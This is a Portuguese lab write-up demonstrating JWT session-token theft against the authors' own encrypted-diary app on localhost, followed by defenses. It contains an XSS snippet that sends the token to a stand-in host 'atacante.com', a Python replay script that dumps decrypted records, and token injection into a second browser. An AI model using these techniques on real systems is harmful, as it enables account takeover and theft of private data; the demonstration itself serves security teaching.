# Demonstração do Ataque

## Tipo de ataque

**Session Token Theft** — roubo de token de sessão.

O ataque consiste em obter o JWT de um utilizador autenticado e usá-lo para fazer
pedidos à API como se fosse esse utilizador. O atacante não precisa de saber a
palavra-passe, não precisa de aceder à base de dados e não quebra nenhuma primitiva
criptográfica.

O XSS (*Cross-Site Scripting*) é um dos vetores possíveis para executar este ataque
mas não é o ataque em si. O ataque é o que acontece **depois** de o token ser obtido
— independentemente de como foi obtido.

---

## O que o atacante ganha

Com o JWT da vítima, o atacante consegue:

- ler todos os registos do diário em texto limpo;
- ver as datas e o conteúdo completo de cada entrada;
- consultar o estado da blockchain da vítima.

O atacante **não** consegue:

- alterar ou apagar registos (detetado pela blockchain);
- obter a palavra-passe ou as chaves criptográficas da vítima;
- persistir o acesso após o token expirar ou a vítima fazer logout.

---

## Como funciona a sessão na aplicação

Quando um utilizador faz login, o backend:

1. Valida a palavra-passe com bcrypt.
2. Deriva as chaves de cifra e integridade a partir da palavra-passe.
3. Guarda essas chaves em memória associadas a um `session_id` aleatório.
4. Emite um **JWT** que contém o `user_id` e o `session_id`.

O frontend guarda esse JWT em `sessionStorage` com a chave `canttouchme_token`.

Em cada pedido subsequente, o frontend envia o JWT no cabeçalho
`Authorization: Bearer <token>`. O backend valida o JWT, recupera as chaves da
sessão em memória e usa-as para decifrar os registos antes de os devolver.

**Consequência:** quem tiver o JWT consegue pedir os registos ao backend e
recebê-los em texto limpo. O backend faz toda a decifra. O atacante não precisa
de saber a palavra-passe nem de ter acesso à base de dados.

---

## Superfície de ataque: sessionStorage

`sessionStorage` é um espaço de armazenamento do browser acessível a qualquer
JavaScript que corra na mesma origem (mesmo protocolo, domínio e porta).

`sessionStorage` é ligeiramente melhor do que `localStorage` porque o token
desaparece quando o separador ou o browser é fechado, mas continua a ser acessível
a qualquer JavaScript durante a sessão ativa.

---

## Como descobrimos os endpoints da API

O FastAPI gera automaticamente documentação interativa da API sem qualquer
autenticação. Qualquer pessoa que saiba o endereço do backend consegue ver todos
os endpoints, parâmetros e schemas de resposta:

| URL | Conteúdo |
|-----|----------|
| `http://localhost:8000/docs` | Swagger UI interativo com todos os endpoints |

A partir do Swagger UI é possível ver que:

- existe `GET /records?page_size=50` que devolve todos os registos decifrados;
- o endpoint requer apenas o header `Authorization: Bearer <token>`;
- os schemas de resposta mostram exatamente os campos devolvidos.

Em alternativa, um atacante pode intercecionar o tráfego da app nas DevTools do
browser (aba *Network*) e observar os pedidos que o frontend faz ao backend.

---

## Vetores reais de obtenção do token

Na demonstração, o token é copiado manualmente da consola do browser. Este gesto
representa o cenário mais direto de todos: **a máquina da vítima está
comprometida**. No mundo real existem vários vetores com o mesmo efeito.

### Máquina comprometida (vetor da demonstração)

Se a máquina do utilizador estiver comprometida — por malware, trojan ou ferramenta
de acesso remoto (RAT) — o atacante tem acesso ao sistema de ficheiros e aos
processos do browser. Ferramentas conhecidas como *stealers* (ex: Redline, Raccoon,
Vidar) fazem exatamente isto: percorrem os browsers instalados, leem o storage e
exfiltram todos os tokens encontrados para um servidor controlado pelo atacante.

O `sessionStorage` não é cifrado em disco nem protegido por qualquer mecanismo do
sistema operativo contra processos locais com as permissões adequadas. Um stealer
a correr na máquina da vítima obtém o token sem interação, sem deixar rasto visível
e sem depender de qualquer vulnerabilidade na aplicação.

Na demonstração, a abertura da consola do browser simula precisamente este acesso
— representa um atacante que já tem controlo sobre a máquina e lê o storage
diretamente.

### XSS — Cross-Site Scripting

Se a aplicação ou uma das suas dependências renderizar conteúdo sem sanitização,
um atacante pode injetar JavaScript que lê o token e o envia para um servidor
controlado por si:

```javascript
// script injetado via XSS
const token = sessionStorage.getItem('canttouchme_token');
fetch('https://atacante.com/collect?t=' + token);
```

Esta app usa React, que escapa HTML por omissão, o que previne XSS direto via
conteúdo dos registos. Numa aplicação com conteúdo partilhado entre utilizadores
(comentários, feeds, perfis públicos), este script correria automaticamente no
browser da vítima quando carregasse a página com o conteúdo malicioso.

### Extensão de browser maliciosa

Uma extensão com permissão `"all_urls"` pode correr JavaScript em qualquer página
visitada pelo utilizador e ler o `sessionStorage` sem qualquer interação visível.

### Acesso físico ao browser

Num computador partilhado ou desbloqueado, qualquer pessoa pode abrir as DevTools
e ler o token enquanto a sessão estiver ativa.

### Rede sem TLS (HTTP em vez de HTTPS)

Em desenvolvimento, a app corre sobre HTTP. O JWT é transmitido em texto claro em
cada pedido. Qualquer pessoa na mesma rede com Wireshark consegue capturar o token:

```
GET /records HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...  ← capturado em claro
```

### Supply chain attack

Se um dos pacotes npm usados pelo frontend for comprometido, o código malicioso
corre na mesma origem que a app e acede ao `sessionStorage` normalmente.

---

## Preparação para a demonstração

Arrancar a aplicação:

```powershell
.\setup.ps1
```

Na aplicação (`http://localhost:5173`):

1. Criar uma conta em `/register`.
2. Iniciar sessão em `/login`.
3. Escrever **pelo menos três registos** em `/app` — usar conteúdo realista, por
   exemplo datas, nomes de pessoas ou informação pessoal.
4. Abrir `/records` e confirmar que todos os registos aparecem decifrados e válidos.

---

## Executar o ataque

### Passo 1 — Descobrir os endpoints

Abrir `http://localhost:8000/docs` e observar que `GET /records` está documentado
publicamente, aceita `page_size` como parâmetro e requer apenas um Bearer token.

### Passo 2 — Roubar o token de sessão

Abrir as ferramentas de desenvolvimento do browser (`F12`) e ir à consola.
Executar:

```javascript
const token = sessionStorage.getItem('canttouchme_token');
console.log(token);
```

O JWT aparece na consola — é uma string longa que começa por `eyJ`.

Este passo representa o cenário em que **a máquina da vítima está comprometida**:
um stealer ou RAT instalado na máquina leria este valor automaticamente e
enviá-lo-ia para o servidor do atacante sem qualquer interação visível. Na
demonstração, o acesso à consola simula esse controlo local sobre a máquina.

### Passo 3 — Exfiltrar todos os registos em texto claro

Na máquina do atacante, com o token copiado, executar:

```python
import requests

TOKEN = "eyJ..."  # colar aqui o token copiado no passo 2

resposta = requests.get(
    "http://localhost:8000/records?page_size=50",
    headers={"Authorization": f"Bearer {TOKEN}"},
)

dados = resposta.json()
print(f"Total de registos: {dados['total']}\n")

for registo in dados["records"]:
    print(f"--- Bloco {registo['block_index']} ({registo['timestamp']}) ---")
    print(registo["text"])
    print()
```

### Alternativa visual — dois browsers

Para uma demonstração mais visual sem script Python:

1. **Browser 1 (vítima):** fazer login e criar registos.
2. Copiar o token da consola do Browser 1.
3. **Browser 2 (atacante):** abrir `http://localhost:5173`, abrir a consola e injetar o token:
   ```javascript
   sessionStorage.setItem('canttouchme_token', 'eyJ...')
   ```
4. Recarregar a página — o Browser 2 abre autenticado como a vítima, com acesso
   total aos seus registos, sem nunca ter introduzido email ou palavra-passe.

---

## Resultado esperado

O script imprime todos os registos em texto limpo, ordenados por bloco.

Exemplo de saída:

```
Total de registos: 3

--- Bloco 1 (2026-05-20T10:15:00Z) ---
Hoje tive uma reunião difícil com o meu chefe. Ele mencionou que...

--- Bloco 2 (2026-05-21T09:30:00Z) ---
Fui ao médico. O resultado dos exames indica que...

--- Bloco 3 (2026-05-22T22:00:00Z) ---
Decidi mudar a palavra-passe de todas as contas. A nova é...
```

O atacante obteve o conteúdo completo do diário pessoal sem:

- conhecer a palavra-passe do utilizador;
- aceder diretamente à base de dados;
- quebrar AES, HMAC ou RSA;
- invalidar ou sequer tocar na cadeia de blocos.

---

## Porque é que a criptografia não protege aqui

A aplicação cifra os registos na base de dados. Essa proteção funciona contra um
atacante que consiga acesso direto ao PostgreSQL — os registos estão cifrados e as
chaves nunca são guardadas na base de dados.

Mas este ataque não passa pela base de dados. Passa pela **API**, como um
utilizador legítimo. O backend verifica o JWT, encontra a sessão em memória com
as chaves derivadas da palavra-passe, decifra os registos e devolve-os em texto
limpo. É exatamente o que faz para o utilizador real.

A cifragem protege **os dados em repouso**. Não protege contra um token
comprometido.

| Proteção implementada        | O que este ataque faz                           |
|------------------------------|-------------------------------------------------|
| AES cifra os registos na BD  | O backend decifra antes de devolver             |
| HMAC verifica integridade    | A integridade está intacta — não há adulteração |
| RSA assina cada bloco        | As assinaturas são válidas                      |
| Blockchain deteta remoções   | Nenhum bloco foi removido                       |
| JWT expira em 30 minutos     | O atacante tem 30 minutos para agir             |

---

## Janela de ataque

O JWT expira ao fim de 30 minutos (`ACCESS_TOKEN_EXPIRE_MINUTES = 30`). O atacante
tem essa janela para usar o token roubado. Se o utilizador fizer logout antes
disso, a sessão em memória é removida e o token deixa de funcionar imediatamente.

Nota: mesmo que a vítima faça logout, um token previamente roubado **não pode ser
invalidado remotamente** — não existe lista de revogação de tokens. O atacante que
já tem o token pode usá-lo até expirar naturalmente, independentemente do logout.

---

## Defesas possíveis

| Defesa                             | Efeito                                                   |
|------------------------------------|----------------------------------------------------------|
| Cookie HttpOnly em vez de sessionStorage | JavaScript deixa de conseguir ler o token        |
| Content Security Policy (CSP)      | Limita os scripts que podem correr na página             |
| Tokens de curta duração + refresh  | Reduz a janela de ataque                                 |
| Logout automático por inatividade  | Invalida a sessão mais cedo                              |
| Lista de revogação de tokens       | Permite invalidar tokens roubados imediatamente          |
| HTTPS obrigatório                  | Impede captura do token em trânsito                      |
